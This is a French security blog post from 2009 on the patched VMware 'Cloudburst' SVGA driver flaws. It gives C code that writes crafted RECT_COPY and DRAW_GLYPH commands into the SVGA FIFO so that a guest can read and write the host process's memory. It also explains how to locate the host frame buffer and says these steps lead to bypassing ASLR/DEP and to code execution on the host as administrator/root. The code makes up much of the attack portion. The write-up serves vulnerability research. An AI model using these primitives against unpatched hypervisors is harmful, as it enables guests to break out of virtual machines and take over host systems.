---
layout: post
title:  "VMWare Cloudburst suite"
date:   2009-09-14 19:48:00 +0100
categories: [security]
---
Un bref rappel:  
Les failles que je décris se situent dans le driver SVGA de VMWare ([patché depuis plusieurs mois](http://lists.vmware.com/pipermail/security-announce/2009/000055.html)). Nous pouvons interagir avec ce driver en écrivant des commandes dans la mémoire FIFO. (Si vous n’avez pas suivi allez voir le post précédent).

En fonction du fichier de configuration de votre VM et de la version de VMWare vous aurez accès ou non à certaines commandes. Je ne traiterai pas toutes les commandes. Pour jouer avec les requêtes 3D il vous faut ajouter à votre fichier de configuration: `mks.enable3d = “TRUE”`  
Les requêtes 3D ne sont pas documentées et la mémoire FIFO est utilisée comme couche de transport pour l’architecture SVGA3D utilisé par D3D. Je ne m'y suis pas frotté. On fera juste le tour des commandes `RECT_COPY` et `DRAW_GLYPH`, qui appartiennent aux requêtes 2D.

__I] Lecture mémoire relative.__

Pour pouvoir lire la mémoire de l'host on peut utiliser la commande `RECT_COPY`:
{% highlight C %}
#define SVGA_CMD_RECT_COPY  0x3
/* FIFO layout: Source X, Source Y, Dest X, Dest Y, Width, Height */

vmwareWriteWordToFIFO((PDWORD)VgaFifo, SVGA_CMD_RECT_COPY); // SURF_COPY
vmwareWriteWordToFIFO((PDWORD)VgaFifo, 0x80000000-offset); // Source X
vmwareWriteWordToFIFO((PDWORD)VgaFifo, 0x0); // Source Y
vmwareWriteWordToFIFO((PDWORD)VgaFifo, 0x0); // Dest X
vmwareWriteWordToFIFO((PDWORD)VgaFifo, 0x0); // Dest Y
vmwareWriteWordToFIFO((PDWORD)VgaFifo, offset); // Width
vmwareWriteWordToFIFO((PDWORD)VgaFifo, 0x1); // Height
{% endhighlight %}

`Source X` prend comme paramètre des coordonnées en pixel. C’est-à-dire que si `SourceX` vaut 1 la copie s'effectuera avec un décalage de 4 bytes par rapport au début du frame buffer. Avec `0×80000000-offset`, on obtient donc un offset négatif. Pour que la commande `RECT_COPY` soit exécutée, il faut que deux conditions soit remplies: `SourceX>0` et `SourceX+Width<0` sachant que `SourceX+Width` est stockée dans une variable non signée. Dans notre code on aura `SourceX+Width = 0×80000000-offset+offset = -2147483647`. Pour dumper la mémoire après le frame buffer, il suffit de jouer avec les deux paramètres vu précédemment.
{% highlight C %}
vmwareWriteWordToFIFO((PDWORD)VgaFifo, SVGA_CMD_RECT_COPY); // SURF_COPY
vmwareWriteWordToFIFO((PDWORD)VgaFifo, offset); // Source X
vmwareWriteWordToFIFO((PDWORD)VgaFifo, 0x0); // Source Y
vmwareWriteWordToFIFO((PDWORD)VgaFifo, 0x0); // Dest X
vmwareWriteWordToFIFO((PDWORD)VgaFifo, 0x0); // Dest Y
vmwareWriteWordToFIFO((PDWORD)VgaFifo, 0x80000000-offset); // Width
vmwareWriteWordToFIFO((PDWORD)VgaFifo, 0x1); // Height
{% endhighlight %}

__II] Lecture mémoire absolue.__

Le problème de `RECT_COPY` c'est que la lecture mémoire est relative. Si l'on essaye de copier une page mémoire de vmware-vmx qui n'existe pas, on crash le programme. Donc pour fiabiliser l'exploitation du bug il faut trouver où se situe le frame buffer du côté host. Sous un host vista, la page précédant le frame buffer contient l'adresse que nous recherchons. Sous xp c’est plus ardu, on peut retrouver l'adresse avec une commande 3D ou se risquer à utiliser la même méthode que pour un host vista. Mais il y a des risques de violation d'accès mémoire. Chez moi, la plupart de ces techniques fonctionnent (`VMWare player Build: 118166`) mais sur d'autres configurations cela est impossible.
{% highlight C %}
// Exemple pour vista
vmwareWriteWordToFIFO((PDWORD)VgaFifo, SVGA_CMD_RECT_COPY); // SURF_COPY
vmwareWriteWordToFIFO((PDWORD)VgaFifo, 0x80000000 - 0x4); // Source X
vmwareWriteWordToFIFO((PDWORD)VgaFifo, 0x0); // Source Y
vmwareWriteWordToFIFO((PDWORD)VgaFifo, 0x0); // Dest X
vmwareWriteWordToFIFO((PDWORD)VgaFifo, 0x0); // Dest Y
vmwareWriteWordToFIFO((PDWORD)VgaFifo, 0x4); // Width
vmwareWriteWordToFIFO((PDWORD)VgaFifo, 0x1); // Height
FBStartOnHost = VMWARE.FrameBuffer[2];

if(dest < FBStartOnHost) { // dest représente une adresse précise
  offset = (FBStartOnHost-dest)/4;
} else {
  offset = (dest-FBStartOnHost)/4;
}
{% endhighlight %}

Maintenant que l'on a retrouvé l'adresse du frame buffer, on peut lire précisément la mémoire de l'host. On peut donc par exemple récupérer le `PeHeader` de vmware-vmx (se situant toujours en 0×400000) pour avoir la version de VMWare et une vue précise des sections principales de l’exécutable code/data etc.

__III] Écriture en mémoire.__

On peut utiliser la commande `RECT_COPY` pour écraser la mémoire de l'host. Mais cette commande est mieux filtrée au niveau de la destination car dépendante des valeurs de `SVGA_REG_WIDTH` et `SVGA_REG_HEIGHT`. Donc on ne peut écraser seulement quelques Ko précédant le frame buffer. Sur ma version de VMWare, la zone mémoire modifiable correspond au `heap`. J’ai pensé récupérer le `TEB` se situant en `0x7FFDF000` pour ensuite exploiter un `heap overflow`. Mais à cette adresse, j'ai des valeurs ne correspondant pas à une structure de type `TEB`. Et un heap overflow n'est pas forcément une exploitation fiable surtout quand il est dépendant de deux valeurs qu'on ne peut ajuster comme on le désire.

J'ai dû me tourner vers la commande `DRAW_GLYPH` pour vérifier si elle est disponible:
{% highlight C %}
WRITE_PORT_ULONG((PULONG)(IOports+SVGA_INDEX_PORT), SVGA_REG_CAPABILITIES);
if(READ_PORT_ULONG((PULONG)(IOports+SVGA_VALUE_PORT)) & SVGA_CAP_GLYPH) DbgPrint("Glyph enable\");
{% endhighlight %}

Si ce n'est pas le cas il faut rajouter `svga.yesGlyphs=”TRUE”` dans votre fichier de configuration. Cette commande n'est absolument pas filtrée au niveau de la destination en X/Y, permettant ainsi d'écrire en mémoire où l'on veut. La taille minimale d'un glyph est de 32 pixels et il va écrire un seul pixel à l'offset `0×6` par rapport à `Destination X`. Il faut donc faire attention aux violations d'accès quand on écrit au bord d’une plage mémoire. Un petit exemple:
{% highlight C %}
// On va écrire 0xD34DB33F dans le premier DWORD du frame buffer.
vmwareWriteWordToFIFO((PDWORD)VgaFifo, IOports, SVGA_CMD_DRAW_GLYPH);
vmwareWriteWordToFIFO((PDWORD)VgaFifo, IOports, 0x3FFFFFF9); // Dest X
vmwareWriteWordToFIFO((PDWORD)VgaFifo, IOports, 0x0); // Dest Y
vmwareWriteWordToFIFO((PDWORD)VgaFifo, IOports, 0x20); // Width
vmwareWriteWordToFIFO((PDWORD)VgaFifo, IOports, 0x1); // Height
vmwareWriteWordToFIFO((PDWORD)VgaFifo, IOports, 0xD34DB33F); // Valeur
{% endhighlight %}

On peut donc lire/écrire en mémoire de façon fiable. En résumé, le plus dur est de retrouver l'adresse du frame buffer sans crasher vmware-vmx. Il est ensuite possible d’outrepasser des protections telles que l'`ASLR` ou le `DEP` et créer un canal de communication dans une zone mémoire partagée entre le guest et l'host (le framme buffer par exemple) et exécuter du code. VMWare tournant en Administrateur/root et possédant le token `SeLoadDriverPrivilege` sous windows, au niveau de l'execution de code on peut tout faire!
